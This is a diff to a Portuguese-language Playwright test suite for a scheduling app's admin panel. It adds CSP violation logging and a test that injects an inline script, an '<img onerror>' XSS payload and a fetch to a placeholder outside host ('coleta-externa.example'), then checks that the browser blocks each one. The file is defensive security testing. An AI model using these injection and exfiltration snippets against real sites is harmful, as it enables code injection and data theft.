@@ -64,7 +64,7 @@ const caixaDoPainel = async (pagina) => { await pagina.locator('#sheet').evaluat
 
 // ---------- navegador ----------
 const navegador = await chromium.launch();
-const erros = [];
+const erros = [], violacoes = [];
 const agendaJs = fs.readFileSync(path.join(RAIZ, 'agenda.js'), 'utf8').replace(/desde: "\d{4}-\d\d-\d\d"/, `desde: "${D5}"`);
 async function contexto(dispositivo, { ligado = true, apiDoBanco = api, medicao = '' } = {}) {
   const c = await navegador.newContext({ ...dispositivo, reducedMotion: 'reduce' });
@@ -73,7 +73,7 @@ async function contexto(dispositivo, { ligado = true, apiDoBanco = api, medicao 
   await c.route('**/agenda.js', (r) => r.fulfill({ contentType: 'text/javascript', body: agendaJs }));
   await c.route(SUPABASE_URL + '/**', apiDoBanco.tratar);
   await c.route('https://wa.me/**', (r) => r.fulfill({ contentType: 'text/html', body: 'whatsapp' }));
-  c.on('page', (p) => p.on('pageerror', (e) => erros.push(p.url() + ': ' + e.message)));
+  c.on('page', (p) => { p.on('pageerror', (e) => erros.push(p.url() + ': ' + e.message)); p.on('console', (m) => { if (/Content Security Policy|Refused to/i.test(m.text())) violacoes.push(p.url() + ': ' + m.text().slice(0, 150)); }); });
   return c;
 }
 const ANDROID = devices['Galaxy S9+'], IPHONE = devices['iPhone 13'];
@@ -1185,6 +1185,26 @@ ok(!JSON.stringify(respostaPublica).match(/Joana|Maria|Rita|Edilva|988887777|912
   }
   await c.close();
 }
+// ===== 5b. O painel só executa o próprio código e só fala com o Supabase (CSP) =====
+{
+  ok(!violacoes.length, 'o painel inteiro rodou nos testes acima sem nenhuma violação da política de segurança (CSP)' + (violacoes.length ? ': ' + violacoes[0] : ''));
+  const c = await contexto(IPHONE);
+  const p = await c.newPage();
+  await p.goto(BASE + 'admin/');
+  const r = await p.evaluate(async () => {
+    const s = document.createElement('script'); s.textContent = 'window.__inline = 1'; document.head.appendChild(s);
+    const d = document.createElement('div'); document.body.appendChild(d); d.innerHTML = '<img src="x" onerror="window.__onerror = 1">';
+    await new Promise((f) => setTimeout(f, 400));
+    let fora = true; try { await fetch('https://coleta-externa.example/dados'); } catch (e) { fora = false; }
+    return { inline: window.__inline === 1, onerror: window.__onerror === 1, fora };
+  });
+  ok(!r.inline && !r.onerror, 'painel: nem script injetado nem "onerror" de imagem executam (um nome de cliente malicioso não roda código)');
+  ok(!r.fora, 'painel: não consegue mandar dados para um endereço de fora do Supabase');
+  ok(violacoes.length >= 3, 'painel: o navegador registrou os 3 bloqueios (script, onerror e envio para fora)');
+  violacoes.length = 0;
+  await c.close();
+}
+
 // ===== 6. Cookies e medição de visitas =====
 {
   const google = [];
